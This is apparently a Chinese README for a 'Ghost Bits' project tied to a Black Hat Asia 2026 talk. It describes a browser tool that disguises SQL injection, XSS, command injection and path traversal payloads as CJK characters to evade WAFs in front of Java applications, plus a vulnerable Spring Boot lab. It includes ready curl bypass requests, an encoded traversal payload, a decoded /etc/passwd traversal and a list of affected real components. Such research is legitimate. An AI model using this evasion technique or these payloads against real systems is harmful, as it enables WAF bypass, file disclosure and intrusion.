# Ghost Bits Payload 变形工具 & 复现环境

基于 Black Hat Asia 2026 议题《Cast Attack: A New Threat Posed by Ghost Bits in Java》

## 项目结构

```
├── index.html              # Ghost Bits Payload 变形工具（浏览器打开即用）
├── Dockerfile              # Docker 构建文件
├── docker-compose.yml      # Docker Compose 编排
├── README.md
└── vuln-app/               # 漏洞复现环境（Spring Boot）
    ├── pom.xml
    ├── sensitive.txt        # 靶文件（需路径穿越才能访问）
    ├── files/
    │   └── test.txt         # 正常可读的测试文件
    └── src/main/
        ├── java/com/example/ghostbits/
        │   └── GhostBitsApp.java
        └── resources/
            └── application.properties
```

## Ghost Bits 原理

Java 的 `char` 为 16 位，`byte` 为 8 位。当 `char` 转 `byte` 时，高 8 位被静默丢弃：

```
原始:  '.'  →  0x2E
Ghost: '阮' (U+962E)  →  二进制 0x96|0x2E
还原:  (byte)'阮'  →  丢弃 0x96  →  0x2E  →  '.'
```

WAF 只看到 Unicode 字符串（如 `阮严灵丰丰甲来`），不包含 ASCII 攻击特征，放行。Java 后端 `(byte)ch` 截断高 8 位还原原始攻击载荷。

---

## 一、变形工具使用

浏览器打开 `index.html` 即可使用，无需安装。

### 变形模式

| 模式 | 说明 |
|------|------|
| 智能变形 | 仅替换敏感字符（`' ; - < > / . \` 等） |
| 全量变形 | 替换所有字符 |
| 关键字变形 | 仅替换攻击关键词（SELECT, UNION 等） |
| 自定义 | 手动指定要替换的字符集 |

### Unicode 范围

| 范围 | 效果 |
|------|------|
| CJK 混淆（推荐） | 每字符随机高字节，生成自然中文路径（如 `阮严灵丰丰甲来` → `../`） |
| 0x96xx | 固定高字节，生成类似 `阮陈...` 的汉字 |
| 0x4Exx | CJK 统一汉字一区 |
| 0x2Fxx | CJK 部首，生成类似 `爻` 的字符 |
| 随机高位 | 多区块混合随机 |

### 预设 Payload

SQL 注入 / UNION 注入 / 路径穿越 / 路径穿越（文章复现风格）/ 文件上传 / XSS / 命令注入 / SSTI / LDAP 注入

### 输出格式

UTF-8 文本 / URL 编码 / `\uXXXX` 转义 / Java 字符串 / UTF-8 字节

### 解码还原

工具支持反向解码 — 粘贴变形后的 Payload，点击「解码还原」，自动截断高 8 位还原原始攻击载荷。

---

## 二、复现环境

### 环境要求

- Docker + Docker Compose（推荐）
- 或 Java 8+ / Maven 3.x（本地运行）

### 启动（Docker，推荐）

```bash
docker compose up --build
```

启动后访问 http://localhost:8080 查看说明页。

停止：

```bash
docker compose down
```

### 启动（本地）

```bash
cd vuln-app
mvn spring-boot:run
```

启动后访问 http://localhost:8080 查看说明页。

### 复现步骤

应用从 `files/` 目录读取文件，`sensitive.txt` 位于上一级目录，需要 `../` 穿越。WAF 检查请求参数中是否包含 `..`，但 Ghost 编码后 WAF 看到的是 Unicode 中文字符，不包含 ASCII 攻击特征。

#### 步骤 1：正常读取

```bash
curl "http://localhost:8080/files?path=test.txt"
```

返回 test.txt 内容。

#### 步骤 2：直接穿越（被 WAF 拦截）

```bash
curl "http://localhost:8080/files?path=../sensitive.txt"
```

返回：`[BLOCKED] WAF: Path traversal detected in request string`

#### 步骤 3：Ghost Bits 绕过

```bash
curl "http://localhost:8080/files?path=%E5%B0%AE%E5%84%AE%E7%84%AF%E6%B5%B3%E6%A9%A5%E5%BD%AE%E5%AD%B3%E9%8D%A9%E5%A5%B4%E8%91%A9%E5%89%B6%E5%85%A5%E5%A4%AE%E6%A5%B4%E6%AD%B8%E8%B9%B4"
```

返回 sensitive.txt 内容，包含 `flag{Ghost_Bits_Path_Traversal_BHA2026}`。

**也可以用工具自行生成：**

1. 打开 `index.html`，输入 `../sensitive.txt`
2. 变形模式选「全量变形」，Unicode 范围选「CJK 混淆」
3. 点击「生成 Ghost Bits Payload」
4. 切换到「URL 编码」标签页，复制输出
5. `curl "http://localhost:8080/files?path=<复制的URL编码>"`

#### 步骤 4：验证解码

将变形后的 UTF-8 文本粘贴回工具输入框，点击「解码还原」，还原为 `../sensitive.txt`。

---

## 三、文章复现对照

文章中的路径穿越请求：

```
/阮严灵丰丰甲来/阮严灵丰丰甲来/.../阮严灵丰丰甲来/etc/passw%64
```

逐字符还原：

| Ghost 字符 | Unicode | 高字节 | 低字节 | 还原 |
|-----------|---------|--------|--------|------|
| 阮 | U+962E | 0x96 | 0x2E | `.` |
| 严 | U+4E25 | 0x4E | 0x25 | `%` |
| 灵 | U+7075 | 0x70 | 0x75 | `u` |
| 丰 | U+4E30 | 0x4E | 0x30 | `0` |
| 丰 | U+4E30 | 0x4E | 0x30 | `0` |
| 甲 | U+7532 | 0x75 | 0x32 | `2` |
| 来 | U+6765 | 0x67 | 0x65 | `e` |

`阮严灵丰丰甲来` 还原为 `.%u002e`（URL 编码的 `..`），`passw%64` 中 `%64` = `d`。

---

## 四、受影响组件

| 组件 | 攻击场景 |
|------|---------|
| Apache Commons BCEL | WAF 绕过 / 反序列化 RCE |
| Jackson Databind | WAF 绕过 / SQL 注入 |
| Fastjson | WAF 绕过 / 反序列化 RCE |
| Apache Tomcat | 文件上传绕过 (Webshell) |
| Spring Framework | URL 解码绕过 / 路径穿越 |
| Jetty | URL 解码绕过 / CRLF 注入 |
| Angus Mail | SMTP 注入 |
| Apache HttpClient ≤ 4.5.9 | HTTP 请求走私 |

---

## 免责声明

本工具仅供安全研究与授权测试使用。未经授权对目标系统进行测试属于违法行为。
